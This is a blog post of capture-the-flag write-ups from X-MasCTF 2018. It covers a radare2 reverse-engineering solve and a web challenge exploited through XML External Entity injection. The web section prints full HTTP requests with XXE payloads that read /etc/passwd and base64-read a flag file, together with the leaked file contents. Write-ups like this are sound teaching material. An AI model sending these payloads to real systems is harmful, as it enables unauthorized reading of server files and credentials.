+++
date = 2018-12-16T21:08:42-04:00
tags = ["re", "radare2", "ctf"]
category = ["Capture the Flag Writeups"]
draft = false
title = 'X Masctf2018 Writeups'
+++
## X-MasCTF 2018 RE: Endless Christmas
We are given the 'chall' file.

Running the file command shows us that it's a 64 bit ELF binary.

We proceed to open the file with radare2:
```bash
r2 -A chall
```

![chall-main](/chall-main.png)

Looking at the main function we see that it creates and executes a file from the result of the function @ 0x4006a4.

### main
```highlight
retrieve argc store in local variable local_14h
retrieve argv store in local variable local_20h
store "fileXXXXXX" in local variable template

call 4006a4(0x6b7ce0, 0x601080, 0xb6b21)
0x6b7ce0 - global variable empty
0x601080 - global variable pointing to string of chars

call mkstemp(template)
store return value in fildes = file descriptor

call fchmod(fildes, 0x1ff)

call write(fildes, 0x6b7ce0, 0x12c000)

call fsync(fildes)

call close(fildes)

call execve(template, 0x0, 0x0)

return
```
Running the chall binary generates 13 files and then prompts us for the flag.

We use the following python script to get the functions for all 13 files.
```python
import r2pipe
import os
import sys

bindir = os.listdir(sys.argv[1])

for binary in bindir:
    r2 = r2pipe.open(sys.argv[1] + "/" + binary)
    r2.cmd('aaa')
    functions = r2.cmdj('aflj')
    print binary
    for function in functions:
        print function.get('name')
    print ""

print "Done!"

```
Comparing the output of our python script shows that all the file have the same functions except for one.

We open the file in radare2 and disassemble the main function.

![final-main](/final-main.png)

Looking a the disassembly we see that the main function takes our input and compares it to a constant after xor each character to that constant with 0xd.

We use a python script to extract the constant and xor to get the flag.

```python
import r2pipe
import sys


r2 = r2pipe.open(sys.argv[1])
r2.cmd('aaa')
flag = "".join([chr(ord(i) ^ 0xd) for i in r2.cmd('ps @ 0x601060')])
print flag
```

```highlight
X-MAS{d3c0d3_4641n_4nd_4641n_4nd_4641n_4nd_4641n_4nd_fl46}
```
## X-MasCTF 2018 WEB: Our Christmas Wishlist"
We are presented with a page with a textarea where you can input text.

![initial-page](/wishlist-form-init.png)

We put hello in the textarea an submit the request:

![hello-submit](/wishlist-form-hello.png)

We get the following response:

![hello-response](/wishlist-form-hello-submit.png)

Taking a look at the request in burp we see the following request:

```
POST / HTTP/1.1
Host: 95.179.163.167:12001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://95.179.163.167:12001/
Content-Type: application/xml
Content-Length: 24
Connection: close
Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb

<message>hello</message>
```
with the following response:
```
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 14 Dec 2018 22:38:23 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Length: 16

Your wish: hello
```

Looking at the request we can see that our input is being sent as xml.

We proceed to sent some malformed xml to see how the xml parser will react:
```
POST / HTTP/1.1
Host: 199.247.6.180:12001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://95.179.163.167:12001/
Content-Type: application/xml
Content-Length: 2
Connection: close
Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb

<<
```

Response:
```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 16 Dec 2018 21:19:58 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Length: 811

<br />
<b>Warning</b>:  simplexml_load_string(): Entity: line 1: parser error : StartTag: invalid element name in <b>/var/www/html/index.php</b> on line <b>18</b><br />
<br />
<b>Warning</b>:  simplexml_load_string(): &lt;&lt; in <b>/var/www/html/index.php</b> on line <b>18</b><br />
<br />
<b>Warning</b>:  simplexml_load_string():  ^ in <b>/var/www/html/index.php</b> on line <b>18</b><br />
<br />
<b>Warning</b>:  simplexml_load_string(): Entity: line 1: parser error : Extra content at the end of the document in <b>/var/www/html/index.php</b> on line <b>18</b><br />
<br />
<b>Warning</b>:  simplexml_load_string(): &lt;&lt; in <b>/var/www/html/index.php</b> on line <b>18</b><br />
<br />
<b>Warning</b>:  simplexml_load_string():  ^ in <b>/var/www/html/index.php</b> on line <b>18</b><br />
Your wish: 
```

The error messages in the request shows us the file with the code is located at '/var/www/html/index.php' and that it's using simplexml.

We try check for XXE(XML External Entity) and by trying retrieve /etc/passwd with the following request:
```
POST / HTTP/1.1
Host: 95.179.163.167:12001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://95.179.163.167:12001/
Content-Type: application/xml
Content-Length: 125
Connection: close
Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY internal SYSTEM 'file:///etc/passwd'>]>
<message>hello:&internal;</message>
```

And we get a reponse with the contents of the passwd file:
```
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 14 Dec 2018 23:56:42 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Length: 1359

Your wish: hello:root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www-data:x:82:82:Linux User,,,:/home/www-data:/bin/false
nginx:x:100:101:Linux User,,,:/var/cache/nginx:/sbin/nologin
```
Now that we know it's vulnerable to XXE all we have to do is find and display the flag.


We send to following request to read the file containing the flag as base64 to avoid problem character for the xml parser:
```
POST / HTTP/1.1
Host: 95.179.163.167:12001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://95.179.163.167:12001/
Content-Type: application/xml
Content-Length: 173
Connection: close
Cookie: PHPSESSID=9cef815bea8ae2420273c0fbf61f3bcb

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY internal SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/flag.txt'>]>
<message>&internal;</message>
```

Response:
```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 16 Dec 2018 21:28:05 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Length: 99

Your wish: WC1NQVN7X1RoZV9FeDczcm5hbF9FbnQxdDEzJF9XNG43X1RvX19KbzFuXzdoZV9wNHI3eV9fNzAwX19fX19ffQo=
```

base64 decoding 'WC1NQVN7X1RoZV9FeDczcm5hbF9FbnQxdDEzJF9XNG43X1RvX19KbzFuXzdoZV9wNHI3eV9fNzAwX19fX19ffQo=' give us 'X-MAS{_The_Ex73rnal_Ent1t13$_W4n7_To__Jo1n_7he_p4r7y__700______}' as the flag.
